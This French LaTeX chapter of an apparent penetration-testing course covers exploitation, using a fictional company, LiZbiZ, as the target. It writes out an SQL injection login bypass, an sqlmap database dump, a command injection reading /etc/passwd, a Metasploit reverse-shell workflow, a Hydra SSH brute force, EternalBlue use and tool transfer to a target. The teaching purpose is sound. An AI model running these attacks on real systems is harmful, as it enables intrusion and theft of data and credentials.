% ==============================================================================
% Fichier : 05_exploitation.tex
% Description : Vulnérabilités et Exploitation
% ==============================================================================

\chapter{Vulnérabilités et Exploitation}

Une fois la surface d'attaque cartographiée (Scanning), vient la phase d'\textbf{Exploitation}. L'objectif est de prouver qu'une vulnérabilité identifiée a un impact réel en réussissant à exécuter du code ou à extraire des données sur la cible.

\section{Concepts Fondamentaux de l'Exploitation}
% ------------------------------------------------------------------------------

\subsection{Le Trio de l'Attaque}

\begin{itemize}
    \item \textbf{Vulnérabilité :} La faille technique (ex: code mal écrit, configuration faible).
    \item \textbf{Exploit :} Le code ou la méthode utilisée pour abuser de la vulnérabilité.
    \item \textbf{Payload :} Le "fardeau" transporté par l'exploit pour exécuter une action sur la cible (ex: ouvrir un shell, créer un utilisateur).
\end{itemize}

\subsection{Types de Shells}

L'objectif ultime de l'exploitation est souvent d'obtenir un accès à distance (Shell).

\begin{table}[h!]
\centering
\begin{tabular}{p{3cm}p{5cm}p{4cm}}
    \toprule
    \textbf{Type} & \textbf{Fonctionnement} & \textbf{Usage} \\
    \midrule
    \textbf{Reverse Shell} & La cible se connecte à l'attaquant (Outbound). & Contourne les pare-feux (les connexions sortantes sont souvent autorisées). \\
    \textbf{Bind Shell} & La cible écoute sur un port, l'attaquant s'y connecte (Inbound). & Utile si aucun pare-feu ne bloque l'entrée. \\
    \textbf{Web Shell} & Script déposé sur le serveur web (ex: PHP). & Persistant, facile à utiliser via un navigateur. \\
    \bottomrule
\end{tabular}
\caption{Types de shells}
\end{table}

% ------------------------------------------------------------------------------
\section{Exploitation Web (OWASP Top 10)}
% ------------------------------------------------------------------------------

Les applications web sont souvent la porte d'entrée la plus facile.

\subsection{Injection SQL (SQLi)}

\begin{boxdef}
\textbf{SQLi :} Technique consistant à injecter du code SQL malveillant dans les entrées de l'application pour manipuler la base de données.
\end{boxdef}

\textbf{Types de SQLi :}
\begin{itemize}
    \item \textbf{In-Band (Classique) :} L'attaquant voit les résultats directement sur la page (Error based, Union based).
    \item \textbf{Blind (Aveugle) :} L'attaquant ne voit pas les données mais peut déduire la réponse via le comportement de la page (Boolean based, Time based).
\end{itemize}

\begin{boxlizbiz}
\textbf{Attaque LiZbiZ :}
Sur la page de connexion de LiZbiZ, le champ "Nom d'utilisateur" est vulnérable.
\begin{lstlisting}[language=SQL]
Payload : ' OR '1'='1' --
Resultat : La requete devient toujours vraie, connectant l'attaquant en tant qu'admin sans mot de passe.
\end{lstlisting}
Utilisation de \textbf{SQLMap} pour automatiser l'extraction de toute la base de données clients :
\begin{lstlisting}[language=bash]
sqlmap -u "http://lizbiz.local/login?id=1" --dump
\end{lstlisting}
\end{boxlizbiz}

\subsection{File Inclusion (LFI/RFI)}

\begin{itemize}
    \item \textbf{LFI (Local File Inclusion) :} Inclure des fichiers présents sur le serveur (ex: \texttt{/etc/passwd}) via un paramètre non filtré.
    \item \textbf{RFI (Remote File Inclusion) :} Inclure un fichier distant (ex: une backdoor PHP hébergée sur le serveur de l'attaquant).
\end{itemize}

\subsection{Command Injection}

Exécution de commandes système via une entrée utilisateur non nettoyée (ex: ping d'une IP).

\begin{lstlisting}[language=bash, caption=Injection de commande]
Entree : 127.0.0.1 ; cat /etc/passwd
Le serveur execute : ping 127.0.0.1 ; cat /etc/passwd
\end{lstlisting}

% ------------------------------------------------------------------------------
\section{Exploitation Système et Réseau}
% ------------------------------------------------------------------------------

\subsection{Le Framework Metasploit}

C'est l'outil standard pour l'exploitation de vulnérabilités réseaux et systèmes. Il centralise les exploits, les payloads et les encodeurs.

\begin{lstlisting}[language=bash, caption=Workflow Metasploit]
msfconsole
# 1. Chercher un exploit
search apache 2.2.22
# 2. Utiliser l'exploit
use exploit/multi/http/apache_mod_jpeg_overflow
# 3. Configurer la cible
set RHOSTS 192.168.1.10
set PAYLOAD php/meterpreter/reverse_tcp
# 4. Lancer l'attaque
exploit
\end{lstlisting}

\subsection{Exploitation de Services Connus}

\begin{itemize}
    \item \textbf{SSH (Port 22) :} Souvent protégé par mot de passe faible. Utilisation de \texttt{Hydra} pour le Brute Force.
    \begin{lstlisting}[language=bash]
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10
    \end{lstlisting}
    \item \textbf{SMB (Port 445) :} Cible privilégiée. Exploitation de failles comme \textbf{EternalBlue (MS17-010)} ou \textbf{BlueKeep}.
\end{itemize}

\begin{boxlizbiz}
\textbf{Scénario LiZbiZ :}
Le scan a révélé un serveur Windows Server 2012 R2 non mis à jour (Port 445 ouvert).
L'attaquant utilise le module Metasploit \texttt{exploit/windows/smb/ms17\_010\_eternalblue}.
\textbf{Résultat :} Un shell "SYSTEM" (Administrateur maximum) est ouvert sur le serveur, donnant le contrôle total de la machine.
\end{boxlizbiz}

% ------------------------------------------------------------------------------
\section{Transfert de Fichiers (Post-Exploitation)}
% ------------------------------------------------------------------------------

Une fois un accès obtenu, il faut souvent uploader des outils (Mimikatz, scripts) sur la cible.

\begin{itemize}
    \item \textbf{Serveur HTTP simple :} \texttt{python3 -m http.server 8080} sur la machine attaquante, puis \texttt{wget} ou \texttt{certutil} sur la cible.
    \item \textbf{Netcat :} Transfert direct via socket.
\end{itemize}
